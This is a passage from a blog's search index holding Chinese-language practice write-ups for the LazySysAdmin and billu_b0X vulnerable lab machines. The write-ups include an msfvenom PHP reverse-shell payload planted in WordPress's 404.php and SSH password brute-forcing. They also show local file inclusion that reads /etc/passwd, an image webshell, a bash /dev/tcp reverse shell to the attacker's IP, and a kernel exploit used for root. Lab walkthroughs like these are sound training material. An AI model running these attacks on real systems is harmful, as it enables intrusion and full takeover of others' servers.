alt="image-20210131222828646"></p><p>再登录下后台试试，登录成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131223001074.png" alt="image-20210131223001074"></p><p>进到后台之后挨个页面查看，可以看到一个页面可以修改部分页面代码，如下图，我们可以看到一个404.php，点进去看一下</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131223240722.png" alt="image-20210131223240722"></p><p>看了这个页面内容后，这是一个显示访问页面不存在的一个跳转页面，我们测试一下猜想，在/wordpress路径下随便提交个不存在的参数</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131223710635.png" alt="image-20210131223710635"></p><p>可以看到，上下两图的回显内容是一样的，是此页面对应的源码没错</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131223637610.png" alt="image-20210131223637610"></p><p>既然这里可以修改源码，那我们可以在这里换上我们的代码，反弹一个shell回来</p><p>先用msf制作一个反弹shell的php木马</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p php/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.1.137 <span class="hljs-attribute">lport</span>=4444 -f<span class="hljs-built_in"> raw </span>&gt; 1.php<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210113200422878.png" alt="image-20210113200422878"></p><p>生成木马如下图，ip地址为kali的ip，端口号4444为kali要监听的端口</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210113200652237.png" alt="image-20210113200652237"></p><p>我们把这个代码内容粘贴到之前的那个404.php里</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131224448320.png" alt="image-20210131224448320"></p><p>点击update更新</p><p>然后在kali端监听端口</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131224649182.png" alt="image-20210131224649182"></p><p>再次刷新之前那个显示notfound的页面，反弹成功，查看下信息，无误</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131224904654.png" alt="image-20210131224904654"></p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>提权用到了之前的那个deets.txt里提到的密码12345，以及/wordpress路径下主页面反复提到的my name is togie(讲实话这个地方一串这个有点吓人)</p><p>言归正传，是在参考了网上其他writeup后发现了这个密码12345和togie的联系和用处(文章末尾附参考链接)，首先我们利用已经获取到的shell，在获取一个交互shell，以使用su命令</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131225911932.png" alt="image-20210131225911932"></p><p>当我们转换到togie用户后会惊喜的发现，他可以直接转root用户，至此提权完毕，整个渗透过程也已经完成了</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131230343421.png" alt="image-20210131230343421"></p><p>提权过程出乎意料的短，整个靶机的渗透过程相对其他靶机也显得稍有些简单，但一切简单全都源于后台放了一个含密码的deets.txt文件在网站wordpress根目录下，此处提到推出服务器后，记得删除该文件，并及时更新密码，但管理员并没有这样做，这也就是lazysysadmin的含义了吧，也是我们平时很容易犯的错误。</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131230650845.png" alt="image-20210131230650845"></p><h4 id="其他思路："><a href="#其他思路：" class="headerlink" title="其他思路："></a>其他思路：</h4><p>其实刚刚进到wordpress路径下的时候看到那个togie用户名就可以尝试ssh爆破一下的，后来我们看到的那个密码12345强度也相当弱，用网上找的到的大多数字典也都可以爆破的出</p><p>依旧是用msf，用ssh的爆破模块，这里用户名和密码的字典是分开的，用户名的字典里我自己添加了togie这个用户名</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131231448491.png" alt="image-20210131231448491"></p><p>很快就能爆破的出用户名密码 togie:12345</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131231923661.png" alt="image-20210131231923661"></p><p>ssh连接</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131231823832.png" alt="image-20210131231823832"></p><p>切换root用户</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131232113083.png" alt="image-20210131232113083"></p><p>文章参考：</p><p><a href="https://zhuanlan.zhihu.com/p/114916169">https://zhuanlan.zhihu.com/p/114916169</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>靶机渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>靶机练习-1：billu_b0X</title>
    <link href="/2021/04/27/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0-1%EF%BC%9Abillu-b0X/"/>
    <url>/2021/04/27/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0-1%EF%BC%9Abillu-b0X/</url>
    
    <content type="html"><![CDATA[<h2 id="靶机练习-1：billu-b0X"><a href="#靶机练习-1：billu-b0X" class="headerlink" title="靶机练习-1：billu_b0X"></a>靶机练习-1：billu_b0X</h2><h4 id="环境准备："><a href="#环境准备：" class="headerlink" title="环境准备："></a>环境准备：</h4><p>Billu_b0x，VMware虚拟机设置为nat模式，靶机自动获取ip地址</p><p>kali linux 2020虚拟机，ip地址192.168.1.137</p><h4 id="渗透步骤："><a href="#渗透步骤：" class="headerlink" title="渗透步骤："></a>渗透步骤：</h4><h5 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h5><h6 id="1-ip发现"><a href="#1-ip发现" class="headerlink" title="1.ip发现"></a>1.ip发现</h6><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>使用nmap扫描本网段主机，其中192.168.1.1为网卡地址，192.168.1.3为网关，137为本机地址，</p><p>目标靶机ip为192.168.1.132</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/billu_box%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0.png" alt="image-20201231224509510"></p><p>或者使用命令arp-scan -l扫描，效果相同，且不扫描本机</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231224634344.png" alt="image-20201231224634344"></p><h6 id="2-端口及服务扫描"><a href="#2-端口及服务扫描" class="headerlink" title="2.端口及服务扫描"></a>2.端口及服务扫描</h6><p>使用nmap进行端口和服务扫描，指定1-65535全端口，并添加参数A做服务识别和深度扫描，生成结果文件a.txt</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p<span class="hljs-number">1</span>-<span class="hljs-number">65535</span> -A <span class="hljs-number">192.168.1.132</span> -<span class="hljs-literal">oN</span> a.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/billu_b0X%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F.png" alt="image-20201231224915291"></p><p>从上图中可以看到，靶机是一台ubuntu，开启http服务，访问上去看一下</p><p>show me your sqli skills:让展示一下注入技巧，sqlmap测试未果，再看看其他的目录</p><p>[<img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/billu_b0x%E4%B8%BB%E9%A1%B5.png" alt="DKKlKx.png">]</p><h6 id="3-目录及页面扫描"><a href="#3-目录及页面扫描" class="headerlink" title="3.目录及页面扫描"></a>3.目录及页面扫描</h6><p>用kali的dirb跑一下目录</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/billu_b0x%20dirb%E6%89%AB%E6%8F%8F.png" alt="image-20201231225713412">+</p><p>同时windows用御剑跑一下，可以得到更多的爆破结果</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231230127563.png" alt="image-20201231230127563"></p><p>得到页面较多，test.php、add.php、in.php、c.php、index.php、show.php等，目录有：uploaded_images，phpmy，依次访问</p><h5 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h5><h6 id="1-访问test-php：页面提示file参数为空，需要提供file参数"><a href="#1-访问test-php：页面提示file参数为空，需要提供file参数" class="headerlink" title="1.访问test.php：页面提示file参数为空，需要提供file参数"></a>1.访问test.php：页面提示file参数为空，需要提供file参数</h6><p>测试一下文件下载，不行，会跳转回首页</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231230819189.png" alt="image-20201231230819189"></p><h6 id="2-在Firefox的Hackbar中，将get请求，变更为post请求，文件下载"><a href="#2-在Firefox的Hackbar中，将get请求，变更为post请求，文件下载" class="headerlink" title="2.在Firefox的Hackbar中，将get请求，变更为post请求，文件下载"></a>2.在Firefox的Hackbar中，将get请求，变更为post请求，文件下载</h6><p>成功，获得passwd文件，这里用burp改包也行，但是要麻烦一些，就直接hackbar了。</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231231532879.png" alt="image-20201231231532879"></p><h6 id="3-通过同样文件包含的方法，下载add-php、in-php、c-php、index-php、show-php、panel-php等文件，后面可以访问文件的同时，审计文件的源代码。"><a href="#3-通过同样文件包含的方法，下载add-php、in-php、c-php、index-php、show-php、panel-php等文件，后面可以访问文件的同时，审计文件的源代码。" class="headerlink" title="3.通过同样文件包含的方法，下载add.php、in.php、c.php、index.php、show.php、panel.php等文件，后面可以访问文件的同时，审计文件的源代码。"></a>3.通过同样文件包含的方法，下载add.php、in.php、c.php、index.php、show.php、panel.php等文件，后面可以访问文件的同时，审计文件的源代码。</h6><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231231649579.png" alt="image-20201231231649579"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231232504441.png" alt="image-20201231232504441"></p><ol start="4"><li><h6 id="查看passwd文件，发现1个id-1000的账号ica，ssh连接的用户名可以是ica或root"><a href="#查看passwd文件，发现1个id-1000的账号ica，ssh连接的用户名可以是ica或root" class="headerlink" title="查看passwd文件，发现1个id 1000的账号ica，ssh连接的用户名可以是ica或root"></a>查看passwd文件，发现1个id 1000的账号ica，ssh连接的用户名可以是ica或root</h6></li></ol><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231232027735.png" alt="image-20201231232027735"></p><p>访问add.php、in.php页面和审计代码</p><p>add.php是一个上传界面，但是功能无法使用，查看源码文件发现只是个页面，没有后台处理代码。in.php是php info信息</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231232247255.png" alt="image-20201231232247255"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231232539359.png" alt="image-20201231232539359"></p><h6 id="5-查看c-php源码"><a href="#5-查看c-php源码" class="headerlink" title="5.查看c.php源码"></a>5.查看c.php源码</h6><p>这是个数据库连接文件，人家直接写了mysql连接用户名密码</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231232908417.png" alt="image-20201231232908417"></p><h6 id="6-通过dirb暴破出-phpmy目录，访问该目录到phpmyadmin登录页面"><a href="#6-通过dirb暴破出-phpmy目录，访问该目录到phpmyadmin登录页面" class="headerlink" title="6.通过dirb暴破出/phpmy目录，访问该目录到phpmyadmin登录页面"></a>6.通过dirb暴破出/phpmy目录，访问该目录到phpmyadmin登录页面</h6><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231233502816.png" alt="image-20201231233502816"></p><p>用刚刚在c.php看到的用户名：billu，密码：b0x_billu登录，登录成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231233707322.png" alt="image-20201231233707322"></p><p>在ica_lab数据库的auth表中，找到web登录的用户名：biLLu，密码：hEx_it</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231233638955.png" alt="image-20201231233638955"></p><h6 id="7-回index-php，登进去"><a href="#7-回index-php，登进去" class="headerlink" title="7.回index.php，登进去"></a>7.回index.php，登进去</h6><p>进来以后看到一个账号管理界面，里面已经有了两个账户，杰克船长和巴博萨船长</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231234202943.png" alt="image-20201231234202943"></p><p>两个账号的头像图片地址，在之前已经暴破出来：uploaded_images，登上去，下载一张图片jack.jpg出来，里面有些乱七八糟的东西，是我第一遍做的时候传上去的，不管它们，不影响接着做</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231234443183.png" alt="image-20201231234443183"></p><h6 id="7-点击add-user进入添加账号界面，这是一个图片上传，可以利用图片上传和文件包含获得shell。"><a href="#7-点击add-user进入添加账号界面，这是一个图片上传，可以利用图片上传和文件包含获得shell。" class="headerlink" title="7.点击add user进入添加账号界面，这是一个图片上传，可以利用图片上传和文件包含获得shell。"></a>7.点击add user进入添加账号界面，这是一个图片上传，可以利用图片上传和文件包含获得shell。</h6><p>查看之前test文件包含获得的panel.php源码，发现panel.php存在本地文件包含漏洞：</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101103835037.png" alt="image-20210101103835037"></p><p>用文本编辑器打开刚刚下载下来的图片，在文件末尾加一条命令，生成图片马</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101104540102.png" alt="image-20210101104540102"></p><p>把这张图片上传上去</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101111249263.png" alt="image-20210101111249263"></p><p>测试一下图片马能否正常使用，点击continue，用burp抓包，使用burp执行命令：</p><p>post请求url中加入执行命令的参数：POST /panel.php?cmd=cat%20/etc/passwd;ls</p><p>post的body中包含cmd.jpg图片马：load=/uploaded_images/3.jpg&amp;continue=continue</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101111519306.png" alt="image-20210101111519306"></p><p>可以看到测试没有问题，命令成功被执行</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101111627588.png" alt="image-20210101111627588"></p><h6 id="8-制作一个反弹shell，命令：echo-“bash-i-gt-amp-dev-tcp-192-168-1-137-4444-0-gt-amp-1″-bash"><a href="#8-制作一个反弹shell，命令：echo-“bash-i-gt-amp-dev-tcp-192-168-1-137-4444-0-gt-amp-1″-bash" class="headerlink" title="8.制作一个反弹shell，命令：echo “bash -i &gt;&amp; /dev/tcp/192.168.1.137/4444 0&gt;&amp;1″ | bash"></a>8.制作一个反弹shell，命令：echo “bash -i &gt;&amp; /dev/tcp/192.168.1.137/4444 0&gt;&amp;1″ | bash</h6><p>需要先将命令url编码：</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101120048156.png" alt="image-20210101120048156"></p><p>在post的url中加入编码好的命令</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101125246031.png" alt="image-20210101125246031"></p><p>在发送前，先在命令行nc监听，以便接受反弹shell</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101113430892.png" alt="image-20210101113430892"></p><p>点击发送，接收成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101125854351.png" alt="image-20210101125854351"></p><h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><h6 id="1-提权准备工作"><a href="#1-提权准备工作" class="headerlink" title="1.提权准备工作"></a>1.提权准备工作</h6><p>这里需要找一个有写权限的目录，先前我们上传图片的那个目录/uploaded_images，很显然就有写权限，不然也没法往里面上传图片，我们在这个目录下写一个菜刀马，一会方便用菜刀连接传输文件</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101130935950.png" alt="image-20210101130935950"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101130908414.png" alt="image-20210101130908414"></p><p>菜刀连接一下，如图连接成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101131453390.png" alt="image-20210101131453390"></p><h6 id="2-提升权限"><a href="#2-提升权限" class="headerlink" title="2.提升权限"></a>2.提升权限</h6><p>查看系统内核，命令uanme -a和cat /etc/issue</p><p>可以看到详细的系统信息</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101132344836.png" alt="image-20210101132344836"></p><p>这里可以使用一个著名的ubuntu本地提权exp，<a href="https://www.exploit-db.com/exploits/37292%EF%BC%8C%E8%BF%99%E4%B8%AA%E9%93%BE%E6%8E%A5%E5%8F%AF%E4%BB%A5%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5">https://www.exploit-db.com/exploits/37292，这个链接可以下载下来</a></p><p>下载后把这个文件用菜刀放到/uploaded_images目录下</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101132746285.png" alt="image-20210101132746285"></p><p>然后赋予这个文件权限</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101132913066.png" alt="image-20210101132913066"></p><p>编译exp</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101132958470.png" alt="image-20210101132958470"></p><p>然后运行即可提权</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101133102180.png" alt="image-20210101133102180"></p><p>查看是否生效，如图，提权成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101135446041.png" alt="image-20210101135446041"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>在爆破完目录后注意要尽量利用test.php下载所有可下载的页面源码，以提高发现漏洞的可能；在登录phpmyadmin和拿到普通用户密码登录index.php时，要注意区分大小写；在上传图片马成功准备制作反弹shell时，尽量不要耽搁时间，页面会话时间较短，很容易会话过期，在利用图片马时，发送至repeater模块的请求是带有cookie的，若页面会话过期注意重新登录后更换请求，不然带着过期的cookie进行请求会一直接收不到反弹shell（被这个折磨了很久，一开始一直找不到原因）</p>]]></content>
    
    
    
    <tags>
      
      <tag>靶机渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>test-blog</title>
    <link href="/2021/04/27/test-blog/"/>
    <url>/2021/04/27/test-blog/</url>
    
    <content type="html"><![CDATA[<p>你好，这是一个测试博客</p><p><a href="https://imgtu.com/i/gCFQXQ"><img src="https://z3.ax1x.com/2021/04/27/gCFQXQ.jpg" alt="gCFQXQ.jpg"></a></p>]]></content>
    
    
    
    <tags>
      
      <tag>test</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
